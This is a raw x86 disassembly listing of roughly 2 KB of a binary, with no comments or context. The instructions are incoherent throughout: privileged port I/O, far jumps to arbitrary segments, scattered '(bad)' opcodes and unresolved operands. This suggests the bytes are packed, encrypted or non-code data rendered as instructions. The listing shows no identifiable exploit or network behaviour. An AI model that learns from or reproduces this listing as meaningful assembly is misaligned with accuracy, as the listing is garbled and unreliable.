  40822f:	cmp    ch,0xe0
  408232:	adc    ebp,esp
  408234:	sahf   
  408235:	fisttp WORD PTR [eax]
  408237:	daa    
  408238:	out    dx,eax
  408239:	fimul  DWORD PTR [eax-0xdfe315]
  40823f:	loopne 0x4082b6
  408241:	rcr    DWORD PTR [ecx-0x56],0x65
  408245:	mov    al,ds:0x82b96dda
  40824a:	jb     0x40822c
  40824c:	mov    WORD PTR [edi-0x32],?
  40824f:	nop
  408250:	js     0x4082aa
  408252:	xchg   esi,eax
  408253:	enter  0x4a80,0x10
  408257:	add    dh,ch
  408259:	sbb    BYTE PTR [edx-0x734fa8d9],dl
  40825f:	xor    al,0x83
  408261:	sbb    eax,0x4a253caf
  408266:	ins    DWORD PTR es:[edi],dx
  408267:	in     eax,0xe8
  408269:	push   esp
  40826a:	xlat   BYTE PTR ds:[ebx]
  40826b:	push   ebx
  40826c:	hlt    
  40826d:	out    dx,eax
  40826e:	rcl    DWORD PTR [ebp-0x74],1
  408271:	das    
  408272:	mov    cl,BYTE PTR [ebx]
  408274:	js     0x40827b
  408276:	rcl    BYTE PTR [eax+0x25e71b1],0xac
  40827d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40827e:	adc    esp,0xee30387
  408284:	jp     0x4082ec
  408286:	mov    ebp,0x2e9c06fa
  40828b:	push   0x10aa9998
  408290:	in     eax,dx
  408291:	inc    edi
  408292:	sbb    DWORD PTR ds:0xdd70ae39,ebp
  408298:	test   BYTE PTR [ebx-0x29],0x29
  40829c:	ds std 
  40829e:	mov    ecx,ebx
  4082a0:	sahf   
  4082a1:	add    esp,DWORD PTR [esi+0x5f9d5e69]
  4082a7:	sub    DWORD PTR [esi-0x323799e0],ecx
  4082ad:	sahf   
  4082ae:	int3   
  4082af:	inc    edx
  4082b0:	lahf   
  4082b1:	popf   
  4082b2:	ret    
  4082b3:	lahf   
  4082b4:	push   ss
  4082b5:	mov    cl,0xd9
  4082b7:	iret   
  4082b8:	mov    al,ds:0x91b59a7d
  4082bd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4082be:	or     BYTE PTR [edi-0x4b],bh
  4082c1:	stc    
  4082c2:	ret    0xf8df
  4082c5:	outs   dx,BYTE PTR ds:[esi]
  4082c6:	push   es
  4082c7:	push   ebp
  4082c8:	sub    esp,0x12543249
  4082ce:	xor    eax,0x85fff873
  4082d3:	add    DWORD PTR ds:0xf6467b8b,0x5d
  4082da:	pop    es
  4082db:	jmp    0xedd6:0x6cf802ec
  4082e2:	sub    al,0x63
  4082e4:	adc    dl,dl
  4082e6:	sti    
  4082e7:	nop
  4082e8:	imul   edx,DWORD PTR [ecx],0xcc9c0ee7
  4082ee:	or     al,0xdd
  4082f0:	repz into 
  4082f2:	ret    0xd822
  4082f5:	out    dx,eax
  4082f6:	and    ch,dh
  4082f8:	rcl    BYTE PTR [esi],cl
  4082fa:	lahf   
  4082fb:	ss adc eax,edx
  4082fe:	dec    ebx
  4082ff:	xchg   ecx,esp
  408301:	cli    
  408302:	ins    BYTE PTR es:[edi],dx
  408303:	mov    ebp,0x8079c56a
  408308:	sbb    bh,BYTE PTR [ebx]
  40830a:	fldenv [ebx]
  40830c:	ror    BYTE PTR [esi],cl
  40830e:	in     al,0x86
  408310:	push   edi
  408311:	ins    BYTE PTR es:[edi],dx
  408312:	or     BYTE PTR [eax-0x7e4a15ee],ah
  408318:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408319:	out    0xa5,eax
  40831b:	xor    edx,eax
  40831d:	dec    ebx
  40831e:	mov    ds:0xbd5c73df,al
  408323:	ins    DWORD PTR es:[edi],dx
  408324:	push   es
  408325:	aam    0x5d
  408327:	enter  0x7c66,0xd4
  40832b:	imul   ebx,DWORD PTR [eax+0x4946e822],0xaec638d8
  408335:	inc    ebp
  408336:	cdq    
  408337:	push   0xae97e88a
  40833c:	or     DWORD PTR [edi+0x5e],0xfffffff6
  408340:	(bad)  
  408341:	in     al,dx
  408342:	mov    dl,dl
  408344:	mov    ah,0x4f
  408346:	add    DWORD PTR [esi],eax
  408348:	jnp    0x40833d
  40834a:	push   edi
  40834b:	xchg   ebx,eax
  40834c:	adc    al,0xdf
  40834e:	fwait
  40834f:	add    al,al
  408351:	mov    al,ds:0x84cdda58
  408356:	sti    
  408357:	sub    bh,bl
  408359:	(bad)  
  40835a:	xchg   edi,eax
  40835b:	lock or eax,0x8559b1dc
  408361:	sahf   
  408362:	adc    BYTE PTR [ecx+ebx*2-0x59],bh
  408366:	data16 daa 
  408368:	xor    esi,DWORD PTR [esi-0x5be82afa]
  40836e:	and    al,0x53
  408370:	loope  0x408341
  408372:	mov    WORD PTR [edx+ebx*4-0x40c634bb],gs
  408379:	xchg   ecx,eax
  40837a:	cmc    
  40837b:	mov    al,0xa9
  40837d:	mov    DWORD PTR [edx],edi
  40837f:	imul   ecx,DWORD PTR [ebp+0x3d],0x5ff580bc
  408386:	cmp    edx,edx
  408388:	mov    ah,0x43
  40838a:	cmp    al,0x6a
  40838c:	mov    ds:0x81cc86fa,al
  408391:	(bad)  
  408392:	in     al,0x1c
  408394:	jo     0x408388
  408396:	sub    DWORD PTR [ecx],0xeda9a39f
  40839c:	adc    al,0xeb
  40839e:	mov    WORD PTR [eax+0x7f],fs
  4083a1:	dec    ebp
  4083a2:	pop    edi
  4083a3:	jae    0x40838b
  4083a5:	retf   0x3157
  4083a8:	jbe    0x4083e6
  4083aa:	jns    0x408353
  4083ac:	(bad)  
  4083ad:	scas   al,BYTE PTR es:[edi]
  4083ae:	jl     0x408411
  4083b0:	call   0xc37fdd67
  4083b5:	add    DWORD PTR [esi-0x7a27f255],ebx
  4083bb:	or     esp,DWORD PTR [eax-0x32]
  4083be:	out    dx,eax
  4083bf:	push   es
  4083c0:	xor    edx,ebx
  4083c2:	mov    ah,BYTE PTR [ebp+eiz*8-0x71]
  4083c6:	aam    0x5c
  4083c8:	mov    ebx,0x49853ae
  4083cd:	dec    edi
  4083ce:	test   DWORD PTR [eax+0x58f475ac],esp
  4083d4:	push   edi
  4083d5:	dec    esi
  4083d6:	or     BYTE PTR [ecx*8+0x5beb908d],cl
  4083dd:	mov    ah,0x4e
  4083df:	lea    edx,[eax+0xa5be939]
  4083e5:	ins    BYTE PTR es:[edi],dx
  4083e6:	aaa    
  4083e7:	jne    0x408434
  4083e9:	adc    al,BYTE PTR [eax+0x51ade399]
  4083ef:	jnp    0x40845d
  4083f1:	mov    dl,0x24
  4083f3:	cmp    ebp,0x943637e1
  4083f9:	sbb    DWORD PTR [edx+0x45d333c],0x6ec766f6
  408403:	xlat   BYTE PTR ds:[ebx]
  408404:	hlt    
  408405:	pop    edx
  408406:	xlat   BYTE PTR ds:[ebx]
  408407:	fdiv   QWORD PTR [eax]
  408409:	gs mov edi,0x111c731c
  40840f:	out    0xc4,eax
  408411:	nop
  408412:	call   0x4f16:0xd26df0f3
  408419:	mov    al,ds:0xd882b780
  40841e:	clc    
  40841f:	inc    edi
  408420:	push   cs
  408421:	in     eax,dx
  408422:	pop    eax
  408423:	mov    edi,0xd14872ce
  408428:	jae    0x4083d6
  40842a:	mov    esi,0x906944b6
  40842f:	icebp  
  408430:	shr    BYTE PTR [ebx+0x53d1669e],cl
  408436:	shl    BYTE PTR [edi+esi*8+0x8],cl
  40843a:	mov    bh,0x11
  40843c:	arpl   WORD PTR [ebp+0x30],cx
  40843f:	xchg   edx,eax
  408440:	dec    ecx
  408441:	cwde   
  408442:	xchg   ebx,eax
  408443:	ficom  WORD PTR ds:0xa5438188
  408449:	push   ecx
  40844a:	and    eax,0xdfb32556
  40844f:	rcr    BYTE PTR [ecx],1
  408451:	push   ecx
  408452:	jp     0x4084cd
  408454:	aas    
  408455:	retf   
  408456:	fwait
  408457:	iret   
  408458:	loop   0x4084ca
  40845a:	or     BYTE PTR [edi],al
  40845c:	inc    ebx
  40845d:	(bad)  
  40845e:	sbb    ch,al
  408460:	add    ah,BYTE PTR [esi]
  408462:	scas   eax,DWORD PTR es:[edi]
  408463:	adc    ecx,DWORD PTR [edi+0x49]
  408466:	sbb    al,0x6a
  408468:	daa    
  408469:	push   ebx
  40846a:	aas    
  40846b:	iret   
  40846c:	mov    ds:0x829c01c4,al
  408471:	aad    0x18
  408473:	sub    eax,0x1a6628a5
  408478:	mov    eax,ds:0xf23e5796
  40847d:	popf   
  40847e:	push   ds
  40847f:	loope  0x4084a7
  408481:	mov    bh,0x1b
  408483:	sahf   
  408484:	jb     0x408414
  408486:	xchg   edx,eax
  408487:	mov    ch,0x28
  408489:	adc    edi,DWORD PTR [ebx+0x4024d554]
  40848f:	(bad)  
  408490:	sar    ah,1
  408492:	mov    DWORD PTR [edx-0x7a8b1d94],edx
  408498:	inc    esp
  408499:	inc    esi
  40849a:	add    al,0xa0
  40849c:	fsubr  QWORD PTR [edi-0x20]
  40849f:	scas   al,BYTE PTR es:[edi]
  4084a0:	fld    QWORD PTR [eax-0xf8c281f]
  4084a6:	call   0x923b7594
  4084ab:	push   0xfffffff5
  4084ad:	inc    esi
  4084ae:	ja     0x4084a4
  4084b0:	jo     0x40844f
  4084b2:	in     eax,dx
  4084b3:	xor    bl,BYTE PTR [ebx+ebx*4+0x693987ae]
  4084ba:	pop    edx
  4084bb:	jge    0x40851e
  4084bd:	rcl    ebx,cl
  4084bf:	sahf   
  4084c0:	jmp    0x4084e8
  4084c2:	aad    0xb4
  4084c4:	lock in al,0xd9
  4084c7:	gs pop esp
  4084c9:	or     dl,0xbf
  4084cc:	gs mov eax,0x798ed4e9
  4084d2:	into   
  4084d3:	int    0x70
  4084d5:	idiv   BYTE PTR [edi+0x3f6ebf4a]
  4084db:	fdivr  DWORD PTR [esp+ebp*4]
  4084de:	jl     0x408528
  4084e0:	mov    ds:0x858040a2,eax
  4084e5:	mov    bh,0xcc
  4084e7:	xchg   esi,eax
  4084e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4084e9:	adc    al,0xd4
  4084eb:	inc    BYTE PTR [eax+0xe]
  4084ee:	jg     0x408567
  4084f0:	pop    ds
  4084f1:	add    esi,edx
  4084f3:	or     al,0x30
  4084f5:	mov    edx,0xdcd19a0
  4084fa:	sbb    DWORD PTR [ecx],edi
  4084fc:	dec    esp
  4084fd:	xor    DWORD PTR [edx+0x51399a1a],eax
  408503:	in     eax,0x0
  408505:	std    
  408506:	and    al,0x79
  408508:	mov    cl,0xb4
  40850a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40850b:	loop   0x40856c
  40850d:	jle    0x40853e
  40850f:	fdivr  DWORD PTR [esp+ecx*2+0x4951699a]
  408516:	push   ss
  408517:	jo     0x40850f
  408519:	cdq    
  40851a:	cmc    
  40851b:	push   ebx
  40851c:	xlat   BYTE PTR ds:[ebx]
  40851d:	xor    BYTE PTR [ecx+ebp*2+0x5f],ch
  408521:	mov    ?,WORD PTR [ebx-0xf]
  408524:	je     0x408518
  408526:	lahf   
  408527:	popa   
  408528:	in     al,dx
  408529:	pop    ebp
  40852a:	into   
  40852b:	inc    eax
  40852c:	call   0x6a50e05c
  408531:	(bad)  
  408532:	hlt    
  408533:	pop    ss
  408534:	in     eax,0x19
  408536:	add    ebp,edi
  408538:	scas   al,BYTE PTR es:[edi]
  408539:	or     BYTE PTR [edx+esi*2+0x20d0a33],0x7a
  408541:	mov    es,edi
  408543:	in     al,dx
  408544:	inc    edx
  408545:	cmp    al,0xa2
  408547:	push   ecx
  408548:	test   al,0xfd
  40854a:	test   al,0x3
  40854c:	fs jecxz 0x40858d
  40854f:	cmp    bh,BYTE PTR [ebp+0x53]
  408552:	pop    edx
  408553:	push   esp
  408554:	imul   ecx,DWORD PTR [ebx-0x70],0xffffff88
  408558:	push   ebp
  408559:	and    eax,DWORD PTR [edx-0x16]
  40855c:	aad    0x68
  40855e:	std    
  40855f:	pop    ebx
  408560:	adc    esi,DWORD PTR [edx-0x4b]
  408563:	(bad)  
  408564:	out    0xec,eax
  408566:	loope  0x408570
  408568:	imul   edi,DWORD PTR [edi+0x7d585b8],0xf28b380e
  408572:	mov    DWORD PTR [esi+0x5d0ced75],ecx
  408578:	jne    0x4085ea
  40857a:	jne    0x408550
  40857c:	shl    DWORD PTR [esi-0x589832e7],1
  408582:	mov    ah,0xd6
  408584:	cmc    
  408585:	lahf   
  408586:	mov    dl,0x72
  408588:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408589:	(bad)  
  40858a:	mov    bh,0xc
  40858c:	pop    edi
  40858d:	mov    bh,0x92
  40858f:	and    edx,DWORD PTR [ebx]
  408591:	mov    cl,0x34
  408593:	fsubr  DWORD PTR [eax-0x1be23600]
  408599:	popa   
  40859a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40859b:	sar    bl,1
  40859d:	push   0x3c
  40859f:	xchg   ebx,eax
  4085a0:	push   ebx
  4085a1:	popa   
  4085a2:	stos   DWORD PTR es:[edi],eax
  4085a3:	push   ss
  4085a4:	and    ebx,edx
  4085a6:	jg     0x4085b2
  4085a8:	or     esp,DWORD PTR [ecx+esi*2+0x53]
  4085ac:	mov    dh,0xff
  4085ae:	call   0xbab1ba01
  4085b3:	add    BYTE PTR [eax],cl
  4085b5:	jg     0x40859f
  4085b7:	cmp    esi,edi
  4085b9:	cs inc edx
  4085bb:	popa   
  4085bc:	neg    DWORD PTR [ecx+0x5bb9f096]
  4085c2:	and    edi,eax
  4085c4:	push   esp
  4085c5:	pop    ds
  4085c6:	push   ecx
  4085c7:	(bad)  
  4085c8:	fcomp  QWORD PTR [ebx]
  4085ca:	mov    ah,0x8d
  4085cc:	jo     0x408614
  4085ce:	and    ebx,esp
  4085d0:	daa    
  4085d1:	ins    BYTE PTR es:[edi],dx
  4085d2:	xor    eax,0xe265a0b8
  4085d7:	and    BYTE PTR ds:0x7f44e755,0xa4
  4085de:	dec    ecx
  4085df:	push   0x9
  4085e1:	idiv   BYTE PTR [ebx+0x7fb08a83]
  4085e7:	xchg   DWORD PTR [ebx],edi
  4085e9:	(bad)  
  4085ea:	dec    esp
  4085eb:	xchg   bp,ax
  4085ed:	test   DWORD PTR [ecx],ecx
  4085ef:	mov    bl,dh
  4085f1:	call   0xcf22:0x3c4407ea
  4085f8:	cld    
  4085f9:	fadd   st(5),st
  4085fb:	cmp    eax,0xeaa04c47
  408600:	adc    eax,0xcc202c86
  408605:	cmp    ebx,esi
  408607:	dec    edi
  408608:	rcl    eax,0x67
  40860b:	push   ebx
  40860c:	pop    edx
  40860d:	test   al,0x2b
  40860f:	inc    eax
  408610:	cmp    bh,BYTE PTR [eax]
  408612:	xlat   BYTE PTR ds:[ebx]
  408613:	clc    
  408614:	inc    eax
  408615:	int3   
  408616:	cli    
  408617:	cmp    dl,dh
  408619:	add    WORD PTR [ebx+ebx*1+0x2c],si
  40861e:	cmc    
  40861f:	loop   0x4085b8
  408621:	cmp    dh,ah
  408623:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408624:	or     bh,dl
  408626:	dec    ecx
  408627:	ret    
  408628:	jae    0x408602
  40862a:	jge    0x408687
  40862c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40862d:	xor    BYTE PTR [ebp+0x45],0xf
  408631:	add    al,0x1
  408633:	imul   ecx,DWORD PTR [edx],0x7e
  408636:	add    DWORD PTR [ebp-0x3a9f8d88],eax
  40863c:	push   ebx
  40863d:	fcom   DWORD PTR ds:[ebx-0x11f473f1]
  408644:	push   0x50ab5015
  408649:	jns    0x4086bf
  40864b:	test   BYTE PTR [ebx-0x79],cl
  40864e:	dec    edx
  40864f:	sub    esi,edi
  408651:	mov    ebp,0xf1447a00
  408656:	in     eax,0x3
  408658:	or     BYTE PTR [ecx+esi*2+0x4a],bl
  40865c:	(bad)
  408661:	inc    ecx
  408662:	in     eax,dx
  408663:	stc    
  408664:	add    al,0xe8
  408666:	mov    bl,0x6b
  408668:	inc    eax
  408669:	jb     0x40867e
  40866b:	fcomi  st,st(4)
  40866d:	test   eax,0x1f891348
  408672:	clc    
  408673:	mov    esi,esi
  408675:	add    al,0x98
  408677:	xor    DWORD PTR [esp+eax*1],ebp
  40867a:	push   ecx
  40867b:	adc    eax,0xddf9a075
  408680:	adc    edi,edx
  408682:	inc    esp
  408683:	xchg   ch,dl
  408685:	fisubr DWORD PTR [edx+0x15a4da84]
  40868b:	add    al,0x4e
  40868d:	sub    DWORD PTR [ecx],esi
  40868f:	sub    bl,dh
  408691:	mov    DWORD PTR [edx+esi*4],ebx
  408694:	cmc    
  408695:	les    ebx,FWORD PTR ds:0x32053adb
  40869b:	mov    BYTE PTR [ebp+0x9],al
  40869e:	mov    bh,bl
  4086a0:	xor    ecx,ebx
  4086a2:	push   esp
  4086a3:	sub    bl,BYTE PTR [edx]
  4086a5:	pop    ebx
  4086a6:	mov    al,0xd7
  4086a8:	loopne 0x408630
  4086aa:	mov    ah,0xb6
  4086ac:	mov    bl,0x8f
  4086ae:	jp     0x408729
  4086b0:	xchg   edx,eax
  4086b1:	scas   al,BYTE PTR es:[edi]
  4086b2:	in     eax,0x3e
  4086b4:	call   0x2f0:0xfaf13a5e
  4086bb:	adc    edi,DWORD PTR [esi-0x38]
  4086be:	das    
  4086bf:	dec    esi
  4086c0:	pop    ebp
  4086c1:	xchg   ebx,eax
  4086c2:	(bad)  
  4086c3:	xor    ch,BYTE PTR [edi+ebx*4-0x1705416a]
  4086ca:	sahf   
  4086cb:	cmc    
  4086cc:	and    al,0xfe
  4086ce:	jne    0x40869f
  4086d0:	push   0x37
  4086d2:	aad    0xd5
  4086d4:	jno    0x408710
  4086d6:	jg     0x4086a8
  4086d8:	mov    ecx,0x6c46a0e5
  4086dd:	or     DWORD PTR gs:[ebx-0x56],edi
  4086e1:	xchg   edi,eax
  4086e2:	push   eax
  4086e3:	mov    ch,0x8a
  4086e5:	leave  
  4086e6:	aam    0xfb
  4086e8:	loop   0x408708
  4086ea:	retf   
  4086eb:	jns    0x4086cb
  4086ed:	mov    eax,ds:0xcf119154
  4086f2:	jnp    0x4086a5
  4086f4:	mov    al,ds:0x82a33646
  4086f9:	adc    ecx,DWORD PTR [ebx]
  4086fb:	stos   DWORD PTR es:[edi],eax
  4086fc:	repz add BYTE PTR [edi+ecx*8],dh
  408700:	xor    DWORD PTR [ecx+0x4e],edi
  408703:	jle    0x408698
  408705:	adc    BYTE PTR [ecx-0x26699e59],dl
  40870b:	ror    ebp,0x8a
  40870e:	and    BYTE PTR [ebx+0x7eba66b2],al
  408714:	mov    ecx,0xdaa76c2b
  408719:	inc    edx
  40871a:	sub    edx,DWORD PTR [ecx+ebp*4+0x7b]
  40871e:	or     bh,BYTE PTR [ebp+0x68]
  408721:	inc    edi
  408722:	push   eax
  408723:	adc    ecx,ebx
  408725:	fnstenv [eax]
  408727:	arpl   bx,sp
  408729:	pop    ss
  40872a:	xor    bl,BYTE PTR [ecx+0x4afde739]
  408730:	pushf  
  408731:	shl    esp,1
  408733:	push   ss
  408734:	xchg   bl,dl
  408736:	cmovns edi,DWORD PTR [ecx-0x1]
  40873a:	(bad)  
  40873b:	pop    edx
  40873c:	out    0x95,eax
  40873e:	pop    eax
  40873f:	sub    al,0x40
  408741:	sbb    bl,dh
  408743:	cmp    al,0xe5
  408745:	ret    
  408746:	cmp    al,0xa9
  408748:	add    eax,0x72f15fc
  40874d:	fcomi  st,st(1)
  40874f:	pushf  
  408750:	and    BYTE PTR [edi+ecx*4],cl
  408753:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408754:	inc    ebp
  408755:	inc    esi
  408756:	ja     0x408766
  408758:	add    al,ah
  40875a:	shl    DWORD PTR [edi+0x75],0xa5
  40875e:	js     0x4087bd
  408760:	in     al,0xaf
  408762:	les    ecx,FWORD PTR [ebp-0x4b2de887]
  408768:	in     al,0xfd
  40876a:	inc    eax
  40876b:	arpl   WORD PTR [ecx-0x7811a616],sp
  408771:	mov    eax,DWORD PTR [ebx-0x7f8162e0]
  408777:	fdivrp st(3),st
  408779:	xchg   DWORD PTR [edi+0x5072b0a3],edi
  40877f:	inc    esi
  408780:	mov    eax,ds:0x541119b7
  408785:	and    DWORD PTR [esi],esp
  408787:	sbb    BYTE PTR [esi],dl
  408789:	or     DWORD PTR [ecx],ebx
  40878b:	xchg   bh,bl
  40878d:	xor    al,0xfd
  40878f:	scas   al,BYTE PTR es:[edi]
  408790:	add    DWORD PTR [ebx],ebx
  408792:	or     BYTE PTR [edx+0x77c058cf],dl
  408798:	out    0xe0,al
  40879a:	sbb    BYTE PTR [edi-0x72c37363],bh
  4087a0:	fstp   st(3)
  4087a2:	out    dx,al
  4087a3:	sub    cl,bl
  4087a5:	xchg   edx,eax
  4087a6:	sub    eax,0xfd1fec50
  4087ab:	push   ebp
  4087ac:	(bad)  
  4087ad:	fisubr DWORD PTR [ebx+0x7c]
  4087b0:	push   edx
  4087b1:	pop    edx
  4087b2:	xchg   ebx,eax
  4087b3:	cmp    dh,BYTE PTR [ebx+eax*4+0x4e]
  4087b7:	push   ds
  4087b8:	mov    al,0x15
  4087ba:	inc    edi
  4087bb:	(bad)  
  4087bc:	mov    ds:0xc3017127,al
  4087c1:	xor    esi,ebx
  4087c3:	dec    esp
  4087c4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4087c5:	mov    dl,BYTE PTR [edi+0x469ce81b]
  4087cb:	sti    
  4087cc:	pop    esi
  4087cd:	scas   eax,DWORD PTR es:[edi]
  4087ce:	jns    0x4087ce
  4087d0:	jp     0x408784
  4087d2:	push   edx
  4087d3:	retf   0xe767
  4087d6:	loope  0x408775
  4087d8:	not    DWORD PTR [edi]
  4087da:	rcl    BYTE PTR [eax+0x1e],cl
  4087dd:	dec    edx
  4087de:	stos   BYTE PTR es:[edi],al
  4087df:	pmullw mm1,QWORD PTR [esi-0x6d6d6b7b]
  4087e6:	mov    ds:0xdefda31f,eax
  4087eb:	jg     0x4087fa
  4087ed:	mov    al,0x6d
  4087ef:	fcomp  QWORD PTR [esi-0x4e]
  4087f2:	inc    esi
  4087f3:	in     eax,dx
  4087f4:	and    DWORD PTR [edi],edi
  4087f6:	xor    BYTE PTR [esi-0x4],al
  4087f9:	std    
  4087fa:	adc    al,0x5b
  4087fd:	add    al,0x1a
  4087ff:	xchg   dl,bl
  408801:	in     al,0xf
  408803:	sbb    DWORD PTR [edi+0x7e],edx
  408806:	mov    eax,0x60710820
  40880b:	mov    ecx,0xa68bf406
  408810:	push   esp
  408811:	dec    eax
  408812:	adc    ch,0x17
  408815:	mov    esp,DWORD PTR [esi-0x10]
  408818:	data16 add al,0x58
  40881b:	mov    dh,0x3a
  40881d:	in     eax,dx
  40881e:	bound  edx,QWORD PTR [ebx+0x79]
  408821:	rcl    BYTE PTR [esi-0xf87464a],1
  408827:	pop    esi
  408828:	inc    BYTE PTR [ecx+0x39]
  40882b:	fmul   QWORD PTR [esi-0x56]
  40882e:	mov    cl,0x72
  408830:	dec    ebp
  408831:	js     0x408857
  408833:	push   ebx
  408834:	sbb    al,0xb6
  408836:	jb     0x40886b
  408838:	xchg   esp,eax
  408839:	repz push ss
  40883b:	adc    BYTE PTR [ecx+0x62],0xfe
  40883f:	ins    DWORD PTR es:[edi],dx
  408840:	mov    eax,0x60f80676
  408845:	outs   dx,BYTE PTR ds:[esi]
  408846:	or     esi,eax
  408848:	sub    eax,0x19a2c1b4
  40884d:	push   edi
  40884e:	imul   edi,DWORD PTR [ebx],0x0
  408851:	and    ebx,DWORD PTR [ecx]
  408853:	std    
  408854:	fisttp QWORD PTR [edi-0x270956a7]
  40885a:	dec    ecx
  40885b:	cmp    BYTE PTR [ecx],cl
  40885d:	mul    BYTE PTR [ebp+0x58f67e72]
  408863:	jp     0x408843
  408865:	mov    al,ds:0xc7bf2078
  40886a:	call   0x2e6102a3
  40886f:	ret    
  408870:	sbb    eax,DWORD PTR [ecx+0x79bd18a2]
  408876:	dec    edi
  408877:	fsubr  DWORD PTR [esi]
  408879:	or     eax,0x1ccda57a
  40887e:	repz jmp 0x4088ea
  408881:	(bad)  
  408883:	dec    esp
  408884:	push   edx
  408885:	inc    ecx
  408886:	or     ah,BYTE PTR [eax-0x3b3c3fb5]
  40888c:	jns    0x40888d
  40888e:	sbb    eax,0xb452ab6e
  408893:	in     eax,0xc6
  408895:	xchg   edx,eax
  408896:	and    eax,0x39e5af75
  40889b:	mov    eax,0xc5ef7507
  4088a0:	ds (bad) 
  4088a2:	rcl    BYTE PTR [esi+0x77],1
  4088a5:	cwde   
  4088a6:	xchg   edi,eax
  4088a7:	xchg   DWORD PTR [eax],ecx
  4088a9:	mov    esp,0xec9a71e5
  4088ae:	call   0x6b35:0x2b6a819a
  4088b5:	inc    esp
  4088b6:	inc    edx
  4088b7:	sbb    eax,0x946c3099
  4088bc:	inc    ecx
  4088bd:	pop    edi
  4088be:	xchg   esp,eax
  4088bf:	push   esp
  4088c0:	sub    ecx,DWORD PTR [ecx-0xa]
  4088c3:	add    dh,dh
  4088c5:	out    0xbb,al
  4088c7:	outs   dx,DWORD PTR ds:[esi]
  4088c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4088c9:	not    edx
  4088cb:	call   DWORD PTR [edx-0x1991c3fd]
  4088d1:	fisttp QWORD PTR [ecx]
  4088d3:	and    DWORD PTR [esp+eiz*8-0x642dbdcb],esp
  4088da:	outs   dx,DWORD PTR ds:[esi]
  4088db:	popa   
  4088dc:	jl     0x4088f4
  4088de:	frstor [ecx]
  4088e0:	neg    ecx
  4088e2:	mov    eax,0x90d99758
  4088e7:	sub    BYTE PTR [ebp+0x16],dh
  4088ea:	mov    bl,0xb
  4088ec:	pusha  
  4088ed:	repz leave 
  4088ef:	mov    BYTE PTR [ecx+0x7e1dee6],dh
  4088f5:	add    eax,0x91c62662
  4088fa:	jmp    0x4088b3
  4088fc:	xor    al,0xc0
  4088fe:	mov    ecx,0xd2e1ed15
  408903:	retf   0xf5b4
  408906:	xor    ah,0xe0
  408909:	les    edi,FWORD PTR [ebx+edx*4-0x56929f2f]
  408910:	lds    edx,FWORD PTR [ebp+0x61]
  408913:	lds    eax,FWORD PTR [eax]
  408915:	add    al,0xda
  408917:	adc    ecx,DWORD PTR [esp+ecx*4+0x23]
  40891b:	dec    esp
  40891c:	inc    edx
  40891d:	sub    al,BYTE PTR [esi]
  40891f:	cmp    bh,0x7a
  408922:	mov    dh,0xc9
  408924:	lods   eax,DWORD PTR ds:[esi]
  408925:	xor    BYTE PTR [ecx-0x439b00df],bl
  40892b:	jmp    0x29fa:0x92a90352
  408932:	or     DWORD PTR [ebx+0x2c634ecd],edi
  408938:	ror    DWORD PTR [esi],1
  40893a:	dec    ebp
  40893b:	dec    edi
  40893c:	mov    esi,0x1f39a998
  408941:	fiadd  WORD PTR [eax+eax*8-0x51]
  408945:	adc    al,0xb1
  408947:	fs nop
  408949:	les    ebx,FWORD PTR [edi+ebx*4]
  40894c:	pusha  
  40894d:	enter  0x42c2,0xb1
  408951:	ficom  DWORD PTR [ecx+0x67]
  408954:	or     dh,BYTE PTR [edi-0x69836956]
  40895a:	sbb    al,0x44
  40895c:	daa    
  40895d:	iret   
  40895e:	outs   dx,BYTE PTR ds:[esi]
  40895f:	rcr    bl,0x28
  408962:	daa    
  408963:	in     al,dx
  408964:	push   0xffffffb3
  408966:	or     esi,ebp
  408968:	sbb    edx,esi
  40896a:	dec    edx
  40896b:	push   ebx
  40896c:	sar    al,cl
  40896e:	jge    0x4089b5
  408970:	mov    eax,0x8e12faca
  408975:	pop    ebp
  408976:	inc    ebp
  408977:	ror    DWORD PTR [edx],1
  408979:	xchg   BYTE PTR [esi+esi*1-0x4e],al
  40897d:	fdiv   DWORD PTR [edi+0x4a]
  408980:	mov    cl,0x3e
  408982:	xchg   edi,eax
  408983:	in     eax,dx
  408984:	sub    al,0x9
  408986:	pop    eax
  408987:	push   esp
  408988:	cmp    al,BYTE PTR ds:0x1052cf28
  40898e:	sahf   
  40898f:	repz shr dx,0xc1
  408994:	cmp    DWORD PTR [ebx+ebx*2-0x6f],0xbdd98d34
  40899c:	mov    edi,0xf721ce53
  4089a1:	inc    edx
  4089a2:	icebp  
  4089a3:	inc    ebp
  4089a4:	les    esi,FWORD PTR [eax]
  4089a6:	dec    esi
  4089a7:	mov    ebp,0xaeb0c44d
  4089ac:	jl     0x408970
  4089ae:	sub    ch,bh
  4089b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4089b1:	aas    
  4089b2:	pop    esp
  4089b3:	(bad)  
  4089b4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4089b5:	arpl   WORD PTR [edi-0x68],si
  4089b8:	mov    dl,0x6e
  4089ba:	fsub   DWORD PTR [esi]
  4089bc:	pop    edi
  4089bd:	xchg   ebp,eax
  4089be:	jo     0x408984
  4089c0:	jle    0x408989
  4089c2:	jmp    0x48b1:0x5f979c73
  4089c9:	and    edx,DWORD PTR [eax+edi*8+0x4e]
  4089cd:	sub    al,0xa9
  4089cf:	jno    0x9325d33a
  4089d5:	add    cl,BYTE PTR [esi-0x6d1c01ee]
  4089db:	dec    esp
  4089dc:	push   ss
  4089dd:	test   DWORD PTR [ecx],0xbeaf5669
  4089e3:	lea    esp,[edi+edi*4+0x6067cab]
  4089ea:	inc    ebp
  4089eb:	lods   al,BYTE PTR ds:[esi]
  4089ec:	(bad)  
  4089ed:	fldcw  WORD PTR [ecx+0x25b4c5d7]
  4089f3:	fsub   QWORD PTR [ebx-0x1c04688]
  4089f9:	pop    ebx
  4089fa:	jno    0x4089a9
  4089fc:	add    edi,DWORD PTR [edx]
  4089fe:	call   0xed8ff3e4
  408a03:	(bad)  
